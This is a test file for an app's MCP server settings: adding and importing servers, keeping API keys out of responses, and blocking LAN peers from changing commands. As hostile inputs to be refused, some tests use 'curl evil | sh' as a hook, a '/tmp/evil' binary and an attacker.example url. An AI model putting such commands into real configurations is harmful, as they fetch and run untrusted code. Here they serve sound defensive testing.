import { describe, it, expect, afterEach } from 'vitest';
import { mkdirSync, mkdtempSync, readFileSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import YAML from 'yaml';
import { DataStore } from '../src/store/DataStore.ts';
import { MockEngine } from '../src/engine/MockEngine.ts';
import { apiRoutes } from '../src/routes/api.ts';
import { stateView } from '../src/routes/views.ts';
import { importCandidates, parseTomlSubset } from '../src/mcpServers.ts';
import { makeFixture } from './helpers.ts';

let store: DataStore | undefined;
afterEach(() => { store?.close(); store = undefined; });

async function setup(config?: (yml: string) => string) {
  const { dataDir } = makeFixture();
  if (config) writeFileSync(join(dataDir, 'planestro.yml'), config(readFileSync(join(dataDir, 'planestro.yml'), 'utf8')));
  store = await DataStore.open(dataDir);
  const app = apiRoutes(store, new MockEngine(store, () => {}));
  const send = async (method: string, path: string, body?: unknown) => {
    const r = await app.request(path, { method, headers: { 'content-type': 'application/json' }, body: body === undefined ? undefined : JSON.stringify(body) });
    return { status: r.status, text: await r.text() };
  };
  const local = () => YAML.parse(readFileSync(join(dataDir, 'planestro.local.yml'), 'utf8'));
  const state = () => JSON.stringify(stateView(store!, new MockEngine(store!, () => {}), {}));
  return { store, dataDir, send, local, state };
}

/** A fake home folder with a Claude Code and a Codex config: never the real ones. */
function fakeHome(): { home: string; codexHome: string } {
  const home = mkdtempSync(join(tmpdir(), 'planestro-mcp-home-'));
  writeFileSync(join(home, '.claude.json'), JSON.stringify({
    mcpServers: {
      eleven: { type: 'stdio', command: 'uvx', args: ['elevenlabs-mcp'], env: { ELEVENLABS_API_KEY: 'claude-secret-1' } },
      docs: { type: 'http', url: 'https://docs.example/mcp', headers: { Authorization: 'Bearer claude-secret-2' } },
      old: { type: 'sse', url: 'https://sse.example/sse' },
    },
    projects: { '/somewhere/else': { mcpServers: { elsewhere: { command: 'x' } } } },
  }));
  const codexHome = join(home, '.codex');
  mkdirSync(codexHome);
  writeFileSync(join(codexHome, 'config.toml'), [
    'model = "gpt-6"  # a comment',
    '',
    '[mcp_servers.meshy]',
    'command = "npx"',
    'args = [',
    '  "-y",',
    '  "@meshy-ai/meshy-mcp-server", # trailing',
    ']',
    '',
    '[mcp_servers.meshy.env]',
    'MESHY_API_KEY = "codex-secret-3"',
    '',
    '[mcp_servers."eleven"]',
    "command = 'uvx'",
    'env = { ELEVENLABS_API_KEY = "codex-secret-4" }',
    '',
    '[mcp_servers.paused]',
    'url = "https://paused.example/mcp"',
    'http_headers = { "X-Key" = "codex-secret-5" }',
    'enabled = false',
    '',
    '[profiles.fast]',
    'model = "gpt-6-mini"',
  ].join('\n'));
  return { home, codexHome };
}

const SECRETS = ['claude-secret-1', 'claude-secret-2', 'codex-secret-3', 'codex-secret-4', 'codex-secret-5', 'typed-secret', 'replaced-secret'];

describe('MCP servers in Settings (#237)', () => {
  it('adds, edits, turns off and removes a server; its keys are write-only', async () => {
    const { send, local, state } = await setup();
    let r = await send('PUT', '/config/mcp-servers/sounds', { command: 'uvx', args: ['sounds-mcp'], env: { SOUNDS_KEY: 'typed-secret', OTHER: 'x' } });
    expect(r.status).toBe(200);
    expect(local().mcp_servers.sounds).toEqual({ command: 'uvx', args: ['sounds-mcp'], env: { SOUNDS_KEY: 'typed-secret', OTHER: 'x' }, headers: {} });
    // A key left out (or sent empty) is kept; a new value replaces it; null removes it.
    r = await send('PUT', '/config/mcp-servers/sounds', { args: ['sounds-mcp', '--fast'], env: { SOUNDS_KEY: '', OTHER: null, NEW_KEY: 'replaced-secret' } });
    expect(r.status).toBe(200);
    expect(local().mcp_servers.sounds.env).toEqual({ SOUNDS_KEY: 'typed-secret', NEW_KEY: 'replaced-secret' });
    expect(local().mcp_servers.sounds.args).toEqual(['sounds-mcp', '--fast']);
    r = await send('PUT', '/config/mcp-servers/sounds', { enabled: false });
    expect(local().mcp_servers.sounds.enabled).toBe(false);
    r = await send('PUT', '/config/mcp-servers/sounds', { enabled: true });
    expect(local().mcp_servers.sounds).not.toHaveProperty('enabled');
    for (const t of [r.text, state()]) for (const s of SECRETS) expect(t).not.toContain(s);
    expect(JSON.parse(state()).local.mcp_servers.sounds.env).toEqual({ SOUNDS_KEY: '(set)', NEW_KEY: '(set)' });
    // Switching it to HTTP leaves no stdio fields behind.
    r = await send('PUT', '/config/mcp-servers/sounds', { url: 'https://sounds.example/mcp', headers: { Authorization: 'Bearer typed-secret' } });
    expect(local().mcp_servers.sounds).toEqual({ url: 'https://sounds.example/mcp', args: [], env: {}, headers: { Authorization: 'Bearer typed-secret' } });
    expect((await send('DELETE', '/config/mcp-servers/sounds')).status).toBe(200);
    expect(local().mcp_servers).toEqual({});
  });

  it('refuses a server with no command or url, a bad name, an unknown field, and removing one a model uses', async () => {
    const { send } = await setup((yml) => yml.replace(/models:\n/, 'models:\n  - { id: sfx, label: Sound worker, claude_model: claude-sonnet-5, mcp: [sounds] }\n'));
    expect((await send('PUT', '/config/mcp-servers/empty', { args: ['x'] })).status).toBe(400);
    expect((await send('PUT', '/config/mcp-servers/bad%20name', { command: 'x' })).status).toBe(400);
    expect((await send('PUT', '/config/mcp-servers/x', { command: 'x', cwd: '/tmp' })).status).toBe(400);
    expect((await send('PUT', '/config/mcp-servers/sounds', { command: 'uvx' })).status).toBe(200);
    const r = await send('DELETE', '/config/mcp-servers/sounds');
    expect(r.status).toBe(400);
    expect(r.text).toContain('Sound worker');
  });

  it('reads the MCP tables of a Codex config.toml', () => {
    const t = parseTomlSubset('a = 1\n[mcp_servers.x]\ncommand = "c\\"q"\nargs = ["a", \'b\']\nenv = { K = "v", "L" = "w" }\nenabled = true\n[mcp_servers.x.env]\nM = "n"\n[[profiles]]\nname = "p"\n');
    expect(t.mcp_servers).toEqual({ x: { command: 'c"q', args: ['a', 'b'], env: { K: 'v', L: 'w', M: 'n' }, enabled: true } });
  });

  it('imports from ~/.claude.json and ~/.codex/config.toml, recording where each came from, and never shows their keys', async () => {
    const { send, local, store: s } = await setup();
    const { home, codexHome } = fakeHome();
    s.updateLocal({ mcp_servers: { docs: { command: 'mine', args: [], env: {}, headers: {} } } });
    const found = importCandidates(s, { home, codexHome });
    for (const sv of SECRETS) expect(JSON.stringify(found)).not.toContain(sv);
    const by = (source: string, name: string) => found.find((c) => c.source === source && c.name === name);
    expect(by('~/.claude.json', 'eleven')).toMatchObject({ status: 'new', kind: 'stdio', command: 'uvx', env: ['ELEVENLABS_API_KEY'] });
    expect(by('~/.claude.json', 'docs')).toMatchObject({ status: 'present', kind: 'http' });
    expect(by('~/.claude.json', 'old')?.status).toBe('unsupported');
    expect(by('~/.claude.json', 'elsewhere')).toBeUndefined();               // another project's server
    expect(by('~/.codex/config.toml', 'meshy')).toMatchObject({ status: 'new', kind: 'stdio', env: ['MESHY_API_KEY'] });
    expect(by('~/.codex/config.toml', 'eleven')?.status).toBe('duplicate');  // the name is taken by the Claude one
    expect(by('~/.codex/config.toml', 'paused')).toMatchObject({ status: 'new', kind: 'http', headers: ['X-Key'] });

    const r = await importWith(send, { home, codexHome });
    expect(r.status).toBe(200);
    for (const sv of SECRETS) expect(r.text).not.toContain(sv);
    const servers = local().mcp_servers;
    expect(servers.eleven).toMatchObject({ command: 'uvx', args: ['elevenlabs-mcp'], env: { ELEVENLABS_API_KEY: 'claude-secret-1' }, source: '~/.claude.json' });
    expect(servers.meshy).toMatchObject({ command: 'npx', args: ['-y', '@meshy-ai/meshy-mcp-server'], env: { MESHY_API_KEY: 'codex-secret-3' }, source: '~/.codex/config.toml' });
    expect(servers.paused).toMatchObject({ url: 'https://paused.example/mcp', headers: { 'X-Key': 'codex-secret-5' }, enabled: false, source: '~/.codex/config.toml' });
    expect(servers.docs).toEqual({ command: 'mine', args: [], env: {}, headers: {} });   // never overwritten

    // Removing an imported one leaves a marker, so the next import leaves it out.
    expect((await send('DELETE', '/config/mcp-servers/meshy')).status).toBe(200);
    expect(local().mcp_import_skip).toEqual(['~/.codex/config.toml:meshy']);
    expect(importCandidates(s, { home, codexHome }).find((c) => c.name === 'meshy')?.status).toBe('removed');
    await importWith(send, { home, codexHome });
    expect(local().mcp_servers).not.toHaveProperty('meshy');
  });

  it('tests a connection: the server\'s tools, or why it failed, with its keys kept out of the message', async () => {
    const { send } = await setup();
    const server = [
      "const rl = require('readline').createInterface({ input: process.stdin });",
      "const out = (m) => process.stdout.write(JSON.stringify({ jsonrpc: '2.0', ...m }) + '\\n');",
      "rl.on('line', (l) => { const m = JSON.parse(l); if (m.id === undefined) return;",
      "  if (m.method === 'initialize') out({ id: m.id, result: { protocolVersion: m.params.protocolVersion, capabilities: { tools: {} }, serverInfo: { name: 'fake', version: '1' } } });",
      "  else if (m.method === 'tools/list') out({ id: m.id, result: { tools: [{ name: 'make_sound', inputSchema: { type: 'object' } }, { name: 'list_voices', inputSchema: { type: 'object' } }] } });",
      "  else out({ id: m.id, error: { code: -32601, message: 'no' } }); });",
    ].join('\n');
    expect((await send('PUT', '/config/mcp-servers/fake', { command: process.execPath, args: ['-e', server], env: { FAKE_KEY: 'typed-secret' } })).status).toBe(200);
    let r = await send('POST', '/config/mcp-servers/fake/test');
    expect(r.status).toBe(200);
    expect(JSON.parse(r.text)).toEqual({ ok: true, tools: ['make_sound', 'list_voices'] });
    expect((await send('PUT', '/config/mcp-servers/broken', { command: process.execPath, args: ['-e', 'console.error(process.env.FAKE_KEY); process.exit(3)'], env: { FAKE_KEY: 'typed-secret' } })).status).toBe(200);
    r = await send('POST', '/config/mcp-servers/broken/test');
    expect(r.status).toBe(200);
    expect(JSON.parse(r.text).ok).toBe(false);
    expect(r.text).not.toContain('typed-secret');
    expect((await send('POST', '/config/mcp-servers/nope/test')).status).toBe(400);
  });
});

/** The import route reads the home folder from the environment: point it at the fixture for the call. */
async function importWith(send: (m: string, p: string, b?: unknown) => Promise<{ status: number; text: string }>, at: { home: string; codexHome: string }) {
  const was = { HOME: process.env.HOME, CODEX_HOME: process.env.CODEX_HOME };
  process.env.HOME = at.home; process.env.CODEX_HOME = at.codexHome;
  try {
    const preview = await send('GET', '/config/mcp-servers/import');
    expect(preview.status).toBe(200);
    return await send('POST', '/config/mcp-servers/import', {});
  } finally {
    for (const [k, v] of Object.entries(was)) { if (v === undefined) delete process.env[k]; else process.env[k] = v; }
  }
}

describe('MCP server keys stay with the address they were entered for', () => {
  it('a changed url drops the stored headers, so they cannot be sent to another host', async () => {
    const { send, local } = await setup();
    expect((await send('PUT', '/config/mcp-servers/docs', { url: 'https://docs.example/mcp', headers: { Authorization: 'Bearer secret' } })).status).toBe(200);
    // The page sends '' for a key it never had: kept while the url stays, refused once it moves.
    expect((await send('PUT', '/config/mcp-servers/docs', { url: 'https://docs.example/mcp', headers: { Authorization: '' } })).status).toBe(200);
    expect(local().mcp_servers.docs.headers.Authorization).toBe('Bearer secret');
    const moved = await send('PUT', '/config/mcp-servers/docs', { url: 'https://attacker.example/', headers: { Authorization: '' } });
    expect(moved.status).toBe(400);
    expect(moved.text).toMatch(/enter it again, the url changed/);
    expect((await send('PUT', '/config/mcp-servers/docs', { url: 'https://attacker.example/' })).status).toBe(200);
    expect(local().mcp_servers.docs.headers ?? {}).toEqual({});
  });

  it('a changed command drops the stored env', async () => {
    const { send, local } = await setup();
    expect((await send('PUT', '/config/mcp-servers/eleven', { command: 'uvx', args: ['elevenlabs-mcp'], env: { KEY: 'secret' } })).status).toBe(200);
    expect((await send('PUT', '/config/mcp-servers/eleven', { command: 'sh' })).status).toBe(200);
    expect(local().mcp_servers.eleven.env ?? {}).toEqual({});
  });
});

describe('what runs on this machine is changed only from it', () => {
  it('a LAN peer may change a setting, not a command, a program or an MCP server', async () => {
    const { dataDir } = makeFixture();
    store = await DataStore.open(dataDir);
    const app = apiRoutes(store, new MockEngine(store, () => {}));
    const from = (address: string, method: string, path: string, body: unknown) =>
      app.request(path, { method, headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) }, { incoming: { socket: { remoteAddress: address } } });
    expect((await from('192.168.1.20', 'PUT', '/config', { notifications: { on_merge: 'curl evil' } })).status).toBe(403);
    expect((await from('192.168.1.20', 'PUT', '/config', { hooks: { after_worktree_create: ['curl evil | sh'] } })).status).toBe(403);
    expect((await from('192.168.1.20', 'PUT', '/config/local', { claude_bin: '/tmp/evil' })).status).toBe(403);
    expect((await from('192.168.1.20', 'PUT', '/config/mcp-servers/x', { command: 'sh' })).status).toBe(403);
    expect((await from('192.168.1.20', 'POST', '/config/notifications/test', { event: 'on_merge' })).status).toBe(403);
    expect((await from('192.168.1.20', 'PUT', '/config', { ci: { timeout_min: 30 } })).status).toBe(200);
    expect((await from('::ffff:127.0.0.1', 'PUT', '/config', { notifications: { on_merge: 'say merged' } })).status).toBe(200);
  });
});
